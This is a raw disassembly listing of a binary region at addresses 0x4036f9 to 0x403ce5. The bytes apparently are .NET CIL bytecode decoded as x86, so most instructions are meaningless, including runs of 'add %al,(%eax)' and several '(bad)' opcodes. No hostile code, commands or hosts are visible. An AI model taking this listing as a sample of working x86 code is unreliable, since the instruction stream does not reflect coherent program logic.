  4036f9:	00 00                	add    %al,(%eax)
  4036fb:	00 d2                	add    %dl,%dl
  4036fd:	00 00                	add    %al,(%eax)
  4036ff:	00 40 01             	add    %al,0x1(%eax)
  403702:	00 00                	add    %al,(%eax)
  403704:	aa                   	stos   %al,%es:(%edi)
  403705:	01 00                	add    %eax,(%eax)
  403707:	00 13                	add    %dl,(%ebx)
  403709:	02 00                	add    (%eax),%al
  40370b:	00 38                	add    %bh,(%eax)
  40370d:	32 02                	xor    (%edx),%al
  40370f:	00 00                	add    %al,(%eax)
  403711:	02 7b 34             	add    0x34(%ebx),%bh
  403714:	00 00                	add    %al,(%eax)
  403716:	04 6f                	add    $0x6f,%al
  403718:	31 00                	xor    %eax,(%eax)
  40371a:	00 06                	add    %al,(%esi)
  40371c:	6f                   	outsl  %ds:(%esi),(%dx)
  40371d:	23 00                	and    (%eax),%eax
  40371f:	00 0a                	add    %cl,(%edx)
  403721:	13 04 12             	adc    (%edx,%edx,1),%eax
  403724:	04 28                	add    $0x28,%al
  403726:	24 00                	and    $0x0,%al
  403728:	00 0a                	add    %cl,(%edx)
  40372a:	2d 41 02 16 25       	sub    $0x25160241,%eax
  40372f:	0a 7d 32             	or     0x32(%ebp),%bh
  403732:	00 00                	add    %al,(%eax)
  403734:	04 02                	add    $0x2,%al
  403736:	11 04 7d 36 00 00 04 	adc    %eax,0x4000036(,%edi,2)
  40373d:	02 7c 33 00          	add    0x0(%ebx,%esi,1),%bh
  403741:	00 04 12             	add    %al,(%edx,%edx,1)
  403744:	04 02                	add    $0x2,%al
  403746:	28 17                	sub    %dl,(%edi)
  403748:	00 00                	add    %al,(%eax)
  40374a:	2b dd                	sub    %ebp,%ebx
  40374c:	49                   	dec    %ecx
  40374d:	02 00                	add    (%eax),%al
  40374f:	00 02                	add    %al,(%edx)
  403751:	7b 36                	jnp    0x403789
  403753:	00 00                	add    %al,(%eax)
  403755:	04 13                	add    $0x13,%al
  403757:	04 02                	add    $0x2,%al
  403759:	7c 36                	jl     0x403791
  40375b:	00 00                	add    %al,(%eax)
  40375d:	04 fe                	add    $0xfe,%al
  40375f:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  403764:	02 15 25 0a 7d 32    	add    0x327d0a25,%dl
  40376a:	00 00                	add    %al,(%eax)
  40376c:	04 12                	add    $0x12,%al
  40376e:	04 28                	add    $0x28,%al
  403770:	26 00 00             	add    %al,%es:(%eax)
  403773:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403776:	39 e5                	cmp    %esp,%ebp
  403778:	01 00                	add    %eax,(%eax)
  40377a:	00 08                	add    %cl,(%eax)
  40377c:	16                   	push   %ss
  40377d:	91                   	xchg   %eax,%ecx
  40377e:	0d 09 45 05 00       	or     $0x54509,%eax
  403783:	00 00                	add    %al,(%eax)
  403785:	05 00 00 00 6e       	add    $0x6e000000,%eax
  40378a:	00 00                	add    %al,(%eax)
  40378c:	00 dc                	add    %bl,%ah
  40378e:	00 00                	add    %al,(%eax)
  403790:	00 43 01             	add    %al,0x1(%ebx)
  403793:	00 00                	add    %al,(%eax)
  403795:	48                   	dec    %eax
  403796:	01 00                	add    %eax,(%eax)
  403798:	00 38                	add    %bh,(%eax)
  40379a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40379b:	01 00                	add    %eax,(%eax)
  40379d:	00 07                	add    %al,(%edi)
  40379f:	02 7b 34             	add    0x34(%ebx),%bh
  4037a2:	00 00                	add    %al,(%eax)
  4037a4:	04 28                	add    $0x28,%al
  4037a6:	1a 00                	sbb    (%eax),%al
  4037a8:	00 06                	add    %al,(%esi)
  4037aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ab:	37                   	aaa
  4037ac:	00 00                	add    %al,(%eax)
  4037ae:	0a 13                	or     (%ebx),%dl
  4037b0:	05 12 05 28 38       	add    $0x38280512,%eax
  4037b5:	00 00                	add    %al,(%eax)
  4037b7:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  4037bd:	0a 7d 32             	or     0x32(%ebp),%bh
  4037c0:	00 00                	add    %al,(%eax)
  4037c2:	04 02                	add    $0x2,%al
  4037c4:	11 05 7d 37 00 00    	adc    %eax,0x377d
  4037ca:	04 02                	add    $0x2,%al
  4037cc:	7c 33                	jl     0x403801
  4037ce:	00 00                	add    %al,(%eax)
  4037d0:	04 12                	add    $0x12,%al
  4037d2:	05 02 28 18 00       	add    $0x182802,%eax
  4037d7:	00 2b                	add    %ch,(%ebx)
  4037d9:	dd bb 01 00 00 02    	fnstsw 0x2000001(%ebx)
  4037df:	7b 37                	jnp    0x403818
  4037e1:	00 00                	add    %al,(%eax)
  4037e3:	04 13                	add    $0x13,%al
  4037e5:	05 02 7c 37 00       	add    $0x377c02,%eax
  4037ea:	00 04 fe             	add    %al,(%esi,%edi,8)
  4037ed:	15 0a 00 00 01       	adc    $0x100000a,%eax
  4037f2:	02 15 25 0a 7d 32    	add    0x327d0a25,%dl
  4037f8:	00 00                	add    %al,(%eax)
  4037fa:	04 12                	add    $0x12,%al
  4037fc:	05 28 39 00 00       	add    $0x3928,%eax
  403801:	0a 38                	or     (%eax),%bh
  403803:	3c 01                	cmp    $0x1,%al
  403805:	00 00                	add    %al,(%eax)
  403807:	07                   	pop    %es
  403808:	7b 14                	jnp    0x40381e
  40380a:	00 00                	add    %al,(%eax)
  40380c:	04 02                	add    $0x2,%al
  40380e:	7b 34                	jnp    0x403844
  403810:	00 00                	add    %al,(%eax)
  403812:	04 6f                	add    $0x6f,%al
  403814:	0a 00                	or     (%eax),%al
  403816:	00 06                	add    %al,(%esi)
  403818:	6f                   	outsl  %ds:(%esi),(%dx)
  403819:	37                   	aaa
  40381a:	00 00                	add    %al,(%eax)
  40381c:	0a 13                	or     (%ebx),%dl
  40381e:	05 12 05 28 38       	add    $0x38280512,%eax
  403823:	00 00                	add    %al,(%eax)
  403825:	0a 2d 41 02 18 25    	or     0x25180241,%ch
  40382b:	0a 7d 32             	or     0x32(%ebp),%bh
  40382e:	00 00                	add    %al,(%eax)
  403830:	04 02                	add    $0x2,%al
  403832:	11 05 7d 37 00 00    	adc    %eax,0x377d
  403838:	04 02                	add    $0x2,%al
  40383a:	7c 33                	jl     0x40386f
  40383c:	00 00                	add    %al,(%eax)
  40383e:	04 12                	add    $0x12,%al
  403840:	05 02 28 18 00       	add    $0x182802,%eax
  403845:	00 2b                	add    %ch,(%ebx)
  403847:	dd 4d 01             	fisttpll 0x1(%ebp)
  40384a:	00 00                	add    %al,(%eax)
  40384c:	02 7b 37             	add    0x37(%ebx),%bh
  40384f:	00 00                	add    %al,(%eax)
  403851:	04 13                	add    $0x13,%al
  403853:	05 02 7c 37 00       	add    $0x377c02,%eax
  403858:	00 04 fe             	add    %al,(%esi,%edi,8)
  40385b:	15 0a 00 00 01       	adc    $0x100000a,%eax
  403860:	02 15 25 0a 7d 32    	add    0x327d0a25,%dl
  403866:	00 00                	add    %al,(%eax)
  403868:	04 12                	add    $0x12,%al
  40386a:	05 28 39 00 00       	add    $0x3928,%eax
  40386f:	0a 38                	or     (%eax),%bh
  403871:	eb 00                	jmp    0x403873
  403873:	00 00                	add    %al,(%eax)
  403875:	07                   	pop    %es
  403876:	02 7b 34             	add    0x34(%ebx),%bh
  403879:	00 00                	add    %al,(%eax)
  40387b:	04 08                	add    $0x8,%al
  40387d:	28 17                	sub    %dl,(%edi)
  40387f:	00 00                	add    %al,(%eax)
  403881:	06                   	push   %es
  403882:	6f                   	outsl  %ds:(%esi),(%dx)
  403883:	37                   	aaa
  403884:	00 00                	add    %al,(%eax)
  403886:	0a 13                	or     (%ebx),%dl
  403888:	05 12 05 28 38       	add    $0x38280512,%eax
  40388d:	00 00                	add    %al,(%eax)
  40388f:	0a 2d 41 02 19 25    	or     0x25190241,%ch
  403895:	0a 7d 32             	or     0x32(%ebp),%bh
  403898:	00 00                	add    %al,(%eax)
  40389a:	04 02                	add    $0x2,%al
  40389c:	11 05 7d 37 00 00    	adc    %eax,0x377d
  4038a2:	04 02                	add    $0x2,%al
  4038a4:	7c 33                	jl     0x4038d9
  4038a6:	00 00                	add    %al,(%eax)
  4038a8:	04 12                	add    $0x12,%al
  4038aa:	05 02 28 18 00       	add    $0x182802,%eax
  4038af:	00 2b                	add    %ch,(%ebx)
  4038b1:	dd e3                	fucom  %st(3)
  4038b3:	00 00                	add    %al,(%eax)
  4038b5:	00 02                	add    %al,(%edx)
  4038b7:	7b 37                	jnp    0x4038f0
  4038b9:	00 00                	add    %al,(%eax)
  4038bb:	04 13                	add    $0x13,%al
  4038bd:	05 02 7c 37 00       	add    $0x377c02,%eax
  4038c2:	00 04 fe             	add    %al,(%esi,%edi,8)
  4038c5:	15 0a 00 00 01       	adc    $0x100000a,%eax
  4038ca:	02 15 25 0a 7d 32    	add    0x327d0a25,%dl
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	04 12                	add    $0x12,%al
  4038d4:	05 28 39 00 00       	add    $0x3928,%eax
  4038d9:	0a 2b                	or     (%ebx),%ch
  4038db:	67 dd a5 00 00       	frstor 0x0(%di)
  4038e0:	00 07                	add    %al,(%edi)
  4038e2:	02 7b 34             	add    0x34(%ebx),%bh
  4038e5:	00 00                	add    %al,(%eax)
  4038e7:	04 08                	add    $0x8,%al
  4038e9:	28 19                	sub    %bl,(%ecx)
  4038eb:	00 00                	add    %al,(%eax)
  4038ed:	06                   	push   %es
  4038ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4038ef:	37                   	aaa
  4038f0:	00 00                	add    %al,(%eax)
  4038f2:	0a 13                	or     (%ebx),%dl
  4038f4:	05 12 05 28 38       	add    $0x38280512,%eax
  4038f9:	00 00                	add    %al,(%eax)
  4038fb:	0a 2d 3e 02 1a 25    	or     0x251a023e,%ch
  403901:	0a 7d 32             	or     0x32(%ebp),%bh
  403904:	00 00                	add    %al,(%eax)
  403906:	04 02                	add    $0x2,%al
  403908:	11 05 7d 37 00 00    	adc    %eax,0x377d
  40390e:	04 02                	add    $0x2,%al
  403910:	7c 33                	jl     0x403945
  403912:	00 00                	add    %al,(%eax)
  403914:	04 12                	add    $0x12,%al
  403916:	05 02 28 18 00       	add    $0x182802,%eax
  40391b:	00 2b                	add    %ch,(%ebx)
  40391d:	de 7a 02             	fidivrs 0x2(%edx)
  403920:	7b 37                	jnp    0x403959
  403922:	00 00                	add    %al,(%eax)
  403924:	04 13                	add    $0x13,%al
  403926:	05 02 7c 37 00       	add    $0x377c02,%eax
  40392b:	00 04 fe             	add    %al,(%esi,%edi,8)
  40392e:	15 0a 00 00 01       	adc    $0x100000a,%eax
  403933:	02 15 25 0a 7d 32    	add    0x327d0a25,%dl
  403939:	00 00                	add    %al,(%eax)
  40393b:	04 12                	add    $0x12,%al
  40393d:	05 28 39 00 00       	add    $0x3928,%eax
  403942:	0a 02                	or     (%edx),%al
  403944:	7b 34                	jnp    0x40397a
  403946:	00 00                	add    %al,(%eax)
  403948:	04 6f                	add    $0x6f,%al
  40394a:	30 00                	xor    %al,(%eax)
  40394c:	00 06                	add    %al,(%esi)
  40394e:	2c 10                	sub    $0x10,%al
  403950:	07                   	pop    %es
  403951:	7b 13                	jnp    0x403966
  403953:	00 00                	add    %al,(%eax)
  403955:	04 6f                	add    $0x6f,%al
  403957:	30 00                	xor    %al,(%eax)
  403959:	00 06                	add    %al,(%esi)
  40395b:	3a b1 fd ff ff 02    	cmp    0x2fffffd(%ecx),%dh
  403961:	7b 34                	jnp    0x403997
  403963:	00 00                	add    %al,(%eax)
  403965:	04 6f                	add    $0x6f,%al
  403967:	2e 00 00             	add    %al,%cs:(%eax)
  40396a:	06                   	push   %es
  40396b:	de 19                	ficomps (%ecx)
  40396d:	13 06                	adc    (%esi),%eax
  40396f:	02 1f                	add    (%edi),%bl
  403971:	fe                   	(bad)
  403972:	7d 32                	jge    0x4039a6
  403974:	00 00                	add    %al,(%eax)
  403976:	04 02                	add    $0x2,%al
  403978:	7c 33                	jl     0x4039ad
  40397a:	00 00                	add    %al,(%eax)
  40397c:	04 11                	add    $0x11,%al
  40397e:	06                   	push   %es
  40397f:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  403985:	13 02                	adc    (%edx),%eax
  403987:	1f                   	pop    %ds
  403988:	fe                   	(bad)
  403989:	7d 32                	jge    0x4039bd
  40398b:	00 00                	add    %al,(%eax)
  40398d:	04 02                	add    $0x2,%al
  40398f:	7c 33                	jl     0x4039c4
  403991:	00 00                	add    %al,(%eax)
  403993:	04 28                	add    $0x28,%al
  403995:	3e 00 00             	add    %al,%ds:(%eax)
  403998:	0a 2a                	or     (%edx),%ch
  40399a:	00 00                	add    %al,(%eax)
  40399c:	41                   	inc    %ecx
  40399d:	1c 00                	sbb    $0x0,%al
  40399f:	00 00                	add    %al,(%eax)
  4039a1:	00 00                	add    %al,(%eax)
  4039a3:	00 0e                	add    %cl,(%esi)
  4039a5:	00 00                	add    %al,(%eax)
  4039a7:	00 7b 02             	add    %bh,0x2(%ebx)
  4039aa:	00 00                	add    %al,(%eax)
  4039ac:	89 02                	mov    %eax,(%edx)
  4039ae:	00 00                	add    %al,(%eax)
  4039b0:	19 00                	sbb    %eax,(%eax)
  4039b2:	00 00                	add    %al,(%eax)
  4039b4:	0b 00                	or     (%eax),%eax
  4039b6:	00 01                	add    %al,(%ecx)
  4039b8:	1b 30                	sbb    (%eax),%esi
  4039ba:	05 00 33 02 00       	add    $0x23300,%eax
  4039bf:	00 13                	add    %dl,(%ebx)
  4039c1:	00 00                	add    %al,(%eax)
  4039c3:	11 02                	adc    %eax,(%edx)
  4039c5:	7b 38                	jnp    0x4039ff
  4039c7:	00 00                	add    %al,(%eax)
  4039c9:	04 0a                	add    $0xa,%al
  4039cb:	02 7b 3c             	add    0x3c(%ebx),%bh
  4039ce:	00 00                	add    %al,(%eax)
  4039d0:	04 0b                	add    $0xb,%al
  4039d2:	06                   	push   %es
  4039d3:	45                   	inc    %ebp
  4039d4:	03 00                	add    (%eax),%eax
  4039d6:	00 00                	add    %al,(%eax)
  4039d8:	83 00 00             	addl   $0x0,(%eax)
  4039db:	00 48 01             	add    %cl,0x1(%eax)
  4039de:	00 00                	add    %al,(%eax)
  4039e0:	bf 01 00 00 02       	mov    $0x2000001,%edi
  4039e5:	7b 3a                	jnp    0x403a21
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	04 17                	add    $0x17,%al
  4039eb:	91                   	xchg   %eax,%ecx
  4039ec:	0c 08                	or     $0x8,%al
  4039ee:	45                   	inc    %ebp
  4039ef:	03 00                	add    (%eax),%eax
  4039f1:	00 00                	add    %al,(%eax)
  4039f3:	05 00 00 00 92       	add    $0x92000000,%eax
  4039f8:	00 00                	add    %al,(%eax)
  4039fa:	00 54 01 00          	add    %dl,0x0(%ecx,%eax,1)
  4039fe:	00 38                	add    %bh,(%eax)
  403a00:	c4 01                	les    (%ecx),%eax
  403a02:	00 00                	add    %al,(%eax)
  403a04:	02 7b 3b             	add    0x3b(%ebx),%bh
  403a07:	00 00                	add    %al,(%eax)
  403a09:	04 28                	add    $0x28,%al
  403a0b:	27                   	daa
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 72 7d             	or     0x7d(%edx),%dh
  403a11:	00 00                	add    %al,(%eax)
  403a13:	70 07                	jo     0x403a1c
  403a15:	7b 14                	jnp    0x403a2b
  403a17:	00 00                	add    %al,(%eax)
  403a19:	04 7b                	add    $0x7b,%al
  403a1b:	03 00                	add    (%eax),%eax
  403a1d:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403a20:	5d                   	pop    %ebp
  403a21:	00 00                	add    %al,(%eax)
  403a23:	0a 28                	or     (%eax),%ch
  403a25:	5e                   	pop    %esi
  403a26:	00 00                	add    %al,(%eax)
  403a28:	0a 6f 3b             	or     0x3b(%edi),%ch
  403a2b:	00 00                	add    %al,(%eax)
  403a2d:	0a 6f 32             	or     0x32(%edi),%ch
  403a30:	00 00                	add    %al,(%eax)
  403a32:	06                   	push   %es
  403a33:	6f                   	outsl  %ds:(%esi),(%dx)
  403a34:	2b 00                	sub    (%eax),%eax
  403a36:	00 0a                	add    %cl,(%edx)
  403a38:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  403a3e:	00 00                	add    %al,(%eax)
  403a40:	0a 2d 41 02 16 25    	or     0x25160241,%ch
  403a46:	0a 7d 38             	or     0x38(%ebp),%bh
  403a49:	00 00                	add    %al,(%eax)
  403a4b:	04 02                	add    $0x2,%al
  403a4d:	11 05 7d 3d 00 00    	adc    %eax,0x3d7d
  403a53:	04 02                	add    $0x2,%al
  403a55:	7c 39                	jl     0x403a90
  403a57:	00 00                	add    %al,(%eax)
  403a59:	04 12                	add    $0x12,%al
  403a5b:	05 02 28 19 00       	add    $0x192802,%eax
  403a60:	00 2b                	add    %ch,(%ebx)
  403a62:	dd 8f 01 00 00 02    	fisttpll 0x2000001(%edi)
  403a68:	7b 3d                	jnp    0x403aa7
  403a6a:	00 00                	add    %al,(%eax)
  403a6c:	04 13                	add    $0x13,%al
  403a6e:	05 02 7c 3d 00       	add    $0x3d7c02,%eax
  403a73:	00 04 fe             	add    %al,(%esi,%edi,8)
  403a76:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  403a7b:	02 15 25 0a 7d 38    	add    0x387d0a25,%dl
  403a81:	00 00                	add    %al,(%eax)
  403a83:	04 12                	add    $0x12,%al
  403a85:	05 28 2d 00 00       	add    $0x2d28,%eax
  403a8a:	0a 26                	or     (%esi),%ah
  403a8c:	38 37                	cmp    %dh,(%edi)
  403a8e:	01 00                	add    %eax,(%eax)
  403a90:	00 28                	add    %ch,(%eax)
  403a92:	27                   	daa
  403a93:	00 00                	add    %al,(%eax)
  403a95:	0a 02                	or     (%edx),%al
  403a97:	7b 3a                	jnp    0x403ad3
  403a99:	00 00                	add    %al,(%eax)
  403a9b:	04 18                	add    $0x18,%al
  403a9d:	28 1a                	sub    %bl,(%edx)
  403a9f:	00 00                	add    %al,(%eax)
  403aa1:	2b 28                	sub    (%eax),%ebp
  403aa3:	1b 00                	sbb    (%eax),%eax
  403aa5:	00 2b                	add    %ch,(%ebx)
  403aa7:	6f                   	outsl  %ds:(%esi),(%dx)
  403aa8:	28 00                	sub    %al,(%eax)
  403aaa:	00 0a                	add    %cl,(%edx)
  403aac:	0d 16 13 04 07       	or     $0x7041316,%eax
  403ab1:	7b 14                	jnp    0x403ac7
  403ab3:	00 00                	add    %al,(%eax)
  403ab5:	04 7b                	add    $0x7b,%al
  403ab7:	03 00                	add    (%eax),%eax
  403ab9:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403abc:	5d                   	pop    %ebp
  403abd:	00 00                	add    %al,(%eax)
  403abf:	0a 09                	or     (%ecx),%cl
  403ac1:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  403ac4:	00 2b                	add    %ch,(%ebx)
  403ac6:	2c 13                	sub    $0x13,%al
  403ac8:	07                   	pop    %es
  403ac9:	7b 14                	jnp    0x403adf
  403acb:	00 00                	add    %al,(%eax)
  403acd:	04 7b                	add    $0x7b,%al
  403acf:	03 00                	add    (%eax),%eax
  403ad1:	00 04 09             	add    %al,(%ecx,%ecx,1)
  403ad4:	6f                   	outsl  %ds:(%esi),(%dx)
  403ad5:	62 00                	bound  %eax,(%eax)
  403ad7:	00 0a                	add    %cl,(%edx)
  403ad9:	13 04 02             	adc    (%edx,%eax,1),%eax
  403adc:	7b 3b                	jnp    0x403b19
  403ade:	00 00                	add    %al,(%eax)
  403ae0:	04 17                	add    $0x17,%al
  403ae2:	8d 2e                	lea    (%esi),%ebp
  403ae4:	00 00                	add    %al,(%eax)
  403ae6:	01 25 16 11 04 2d    	add    %esp,0x2d041116
  403aec:	03 16                	add    (%esi),%edx
  403aee:	2b 01                	sub    (%ecx),%eax
  403af0:	17                   	pop    %ss
  403af1:	d2 9c 6f 32 00 00 06 	rcrb   %cl,0x6000032(%edi,%ebp,2)
  403af8:	6f                   	outsl  %ds:(%esi),(%dx)
  403af9:	2b 00                	sub    (%eax),%eax
  403afb:	00 0a                	add    %cl,(%edx)
  403afd:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  403b03:	00 00                	add    %al,(%eax)
  403b05:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  403b0b:	0a 7d 38             	or     0x38(%ebp),%bh
  403b0e:	00 00                	add    %al,(%eax)
  403b10:	04 02                	add    $0x2,%al
  403b12:	11 05 7d 3d 00 00    	adc    %eax,0x3d7d
  403b18:	04 02                	add    $0x2,%al
  403b1a:	7c 39                	jl     0x403b55
  403b1c:	00 00                	add    %al,(%eax)
  403b1e:	04 12                	add    $0x12,%al
  403b20:	05 02 28 19 00       	add    $0x192802,%eax
  403b25:	00 2b                	add    %ch,(%ebx)
  403b27:	dd ca                	(bad)
  403b29:	00 00                	add    %al,(%eax)
  403b2b:	00 02                	add    %al,(%edx)
  403b2d:	7b 3d                	jnp    0x403b6c
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	04 13                	add    $0x13,%al
  403b33:	05 02 7c 3d 00       	add    $0x3d7c02,%eax
  403b38:	00 04 fe             	add    %al,(%esi,%edi,8)
  403b3b:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  403b40:	02 15 25 0a 7d 38    	add    0x387d0a25,%dl
  403b46:	00 00                	add    %al,(%eax)
  403b48:	04 12                	add    $0x12,%al
  403b4a:	05 28 2d 00 00       	add    $0x2d28,%eax
  403b4f:	0a 26                	or     (%esi),%ah
  403b51:	2b 75 02             	sub    0x2(%ebp),%esi
  403b54:	7b 3b                	jnp    0x403b91
  403b56:	00 00                	add    %al,(%eax)
  403b58:	04 28                	add    $0x28,%al
  403b5a:	27                   	daa
  403b5b:	00 00                	add    %al,(%eax)
  403b5d:	0a 7e 9a             	or     -0x66(%esi),%bh
  403b60:	00 00                	add    %al,(%eax)
  403b62:	04 6f                	add    $0x6f,%al
  403b64:	63 00                	arpl   %eax,(%eax)
  403b66:	00 0a                	add    %cl,(%edx)
  403b68:	6f                   	outsl  %ds:(%esi),(%dx)
  403b69:	3b 00                	cmp    (%eax),%eax
  403b6b:	00 0a                	add    %cl,(%edx)
  403b6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403b6e:	32 00                	xor    (%eax),%al
  403b70:	00 06                	add    %al,(%esi)
  403b72:	6f                   	outsl  %ds:(%esi),(%dx)
  403b73:	2b 00                	sub    (%eax),%eax
  403b75:	00 0a                	add    %cl,(%edx)
  403b77:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	0a 2d 3e 02 18 25    	or     0x2518023e,%ch
  403b85:	0a 7d 38             	or     0x38(%ebp),%bh
  403b88:	00 00                	add    %al,(%eax)
  403b8a:	04 02                	add    $0x2,%al
  403b8c:	11 05 7d 3d 00 00    	adc    %eax,0x3d7d
  403b92:	04 02                	add    $0x2,%al
  403b94:	7c 39                	jl     0x403bcf
  403b96:	00 00                	add    %al,(%eax)
  403b98:	04 12                	add    $0x12,%al
  403b9a:	05 02 28 19 00       	add    $0x192802,%eax
  403b9f:	00 2b                	add    %ch,(%ebx)
  403ba1:	de 53 02             	ficoms 0x2(%ebx)
  403ba4:	7b 3d                	jnp    0x403be3
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	04 13                	add    $0x13,%al
  403baa:	05 02 7c 3d 00       	add    $0x3d7c02,%eax
  403baf:	00 04 fe             	add    %al,(%esi,%edi,8)
  403bb2:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  403bb7:	02 15 25 0a 7d 38    	add    0x387d0a25,%dl
  403bbd:	00 00                	add    %al,(%eax)
  403bbf:	04 12                	add    $0x12,%al
  403bc1:	05 28 2d 00 00       	add    $0x2d28,%eax
  403bc6:	0a 26                	or     (%esi),%ah
  403bc8:	de 19                	ficomps (%ecx)
  403bca:	13 06                	adc    (%esi),%eax
  403bcc:	02 1f                	add    (%edi),%bl
  403bce:	fe                   	(bad)
  403bcf:	7d 38                	jge    0x403c09
  403bd1:	00 00                	add    %al,(%eax)
  403bd3:	04 02                	add    $0x2,%al
  403bd5:	7c 39                	jl     0x403c10
  403bd7:	00 00                	add    %al,(%eax)
  403bd9:	04 11                	add    $0x11,%al
  403bdb:	06                   	push   %es
  403bdc:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  403be2:	13 02                	adc    (%edx),%eax
  403be4:	1f                   	pop    %ds
  403be5:	fe                   	(bad)
  403be6:	7d 38                	jge    0x403c20
  403be8:	00 00                	add    %al,(%eax)
  403bea:	04 02                	add    $0x2,%al
  403bec:	7c 39                	jl     0x403c27
  403bee:	00 00                	add    %al,(%eax)
  403bf0:	04 28                	add    $0x28,%al
  403bf2:	3e 00 00             	add    %al,%ds:(%eax)
  403bf5:	0a 2a                	or     (%edx),%ch
  403bf7:	00 41 1c             	add    %al,0x1c(%ecx)
  403bfa:	00 00                	add    %al,(%eax)
  403bfc:	00 00                	add    %al,(%eax)
  403bfe:	00 00                	add    %al,(%eax)
  403c00:	0e                   	push   %cs
  403c01:	00 00                	add    %al,(%eax)
  403c03:	00 f8                	add    %bh,%al
  403c05:	01 00                	add    %eax,(%eax)
  403c07:	00 06                	add    %al,(%esi)
  403c09:	02 00                	add    (%eax),%al
  403c0b:	00 19                	add    %bl,(%ecx)
  403c0d:	00 00                	add    %al,(%eax)
  403c0f:	00 0b                	add    %cl,(%ebx)
  403c11:	00 00                	add    %al,(%eax)
  403c13:	01 1b                	add    %ebx,(%ebx)
  403c15:	30 03                	xor    %al,(%ebx)
  403c17:	00 aa 01 00 00 14    	add    %ch,0x14000001(%edx)
  403c1d:	00 00                	add    %al,(%eax)
  403c1f:	11 02                	adc    %eax,(%edx)
  403c21:	7b 3e                	jnp    0x403c61
  403c23:	00 00                	add    %al,(%eax)
  403c25:	04 0a                	add    $0xa,%al
  403c27:	06                   	push   %es
  403c28:	45                   	inc    %ebp
  403c29:	03 00                	add    (%eax),%eax
  403c2b:	00 00                	add    %al,(%eax)
  403c2d:	39 00                	cmp    %eax,(%eax)
  403c2f:	00 00                	add    %al,(%eax)
  403c31:	a0 00 00 00 2f       	mov    0x2f000000,%al
  403c36:	01 00                	add    %eax,(%eax)
  403c38:	00 28                	add    %ch,(%eax)
  403c3a:	6e                   	outsb  %ds:(%esi),(%dx)
  403c3b:	00 00                	add    %al,(%eax)
  403c3d:	06                   	push   %es
  403c3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403c3f:	64 00 00             	add    %al,%fs:(%eax)
  403c42:	0a 13                	or     (%ebx),%dl
  403c44:	05 12 05 28 65       	add    $0x65280512,%eax
  403c49:	00 00                	add    %al,(%eax)
  403c4b:	0a 2d 41 02 16 25    	or     0x25160241,%ch
  403c51:	0a 7d 3e             	or     0x3e(%ebp),%bh
  403c54:	00 00                	add    %al,(%eax)
  403c56:	04 02                	add    $0x2,%al
  403c58:	11 05 7d 42 00 00    	adc    %eax,0x427d
  403c5e:	04 02                	add    $0x2,%al
  403c60:	7c 3f                	jl     0x403ca1
  403c62:	00 00                	add    %al,(%eax)
  403c64:	04 12                	add    $0x12,%al
  403c66:	05 02 28 1d 00       	add    $0x1d2802,%eax
  403c6b:	00 2b                	add    %ch,(%ebx)
  403c6d:	dd 57 01             	fstl   0x1(%edi)
  403c70:	00 00                	add    %al,(%eax)
  403c72:	02 7b 42             	add    0x42(%ebx),%bh
  403c75:	00 00                	add    %al,(%eax)
  403c77:	04 13                	add    $0x13,%al
  403c79:	05 02 7c 42 00       	add    $0x427c02,%eax
  403c7e:	00 04 fe             	add    %al,(%esi,%edi,8)
  403c81:	15 0a 00 00 1b       	adc    $0x1b00000a,%eax
  403c86:	02 15 25 0a 7d 3e    	add    0x3e7d0a25,%dl
  403c8c:	00 00                	add    %al,(%eax)
  403c8e:	04 12                	add    $0x12,%al
  403c90:	05 28 66 00 00       	add    $0x6628,%eax
  403c95:	0a 13                	or     (%ebx),%dl
  403c97:	04 02                	add    $0x2,%al
  403c99:	11 04 7d 41 00 00 04 	adc    %eax,0x4000041(,%edi,2)
  403ca0:	28 7a 00             	sub    %bh,0x0(%edx)
  403ca3:	00 06                	add    %al,(%esi)
  403ca5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ca6:	67 00 00             	add    %al,(%bx,%si)
  403ca9:	0a 13                	or     (%ebx),%dl
  403cab:	06                   	push   %es
  403cac:	12 06                	adc    (%esi),%al
  403cae:	28 68 00             	sub    %ch,0x0(%eax)
  403cb1:	00 0a                	add    %cl,(%edx)
  403cb3:	2d 41 02 17 25       	sub    $0x25170241,%eax
  403cb8:	0a 7d 3e             	or     0x3e(%ebp),%bh
  403cbb:	00 00                	add    %al,(%eax)
  403cbd:	04 02                	add    $0x2,%al
  403cbf:	11 06                	adc    %eax,(%esi)
  403cc1:	7d 43                	jge    0x403d06
  403cc3:	00 00                	add    %al,(%eax)
  403cc5:	04 02                	add    $0x2,%al
  403cc7:	7c 3f                	jl     0x403d08
  403cc9:	00 00                	add    %al,(%eax)
  403ccb:	04 12                	add    $0x12,%al
  403ccd:	06                   	push   %es
  403cce:	02 28                	add    (%eax),%ch
  403cd0:	1e                   	push   %ds
  403cd1:	00 00                	add    %al,(%eax)
  403cd3:	2b dd                	sub    %ebp,%ebx
  403cd5:	f0 00 00             	lock add %al,(%eax)
  403cd8:	00 02                	add    %al,(%edx)
  403cda:	7b 43                	jnp    0x403d1f
  403cdc:	00 00                	add    %al,(%eax)
  403cde:	04 13                	add    $0x13,%al
  403ce0:	06                   	push   %es
  403ce1:	02 7c 43 00          	add    0x0(%ebx,%eax,2),%bh
  403ce5:	00 04 fe             	add    %al,(%esi,%edi,8)
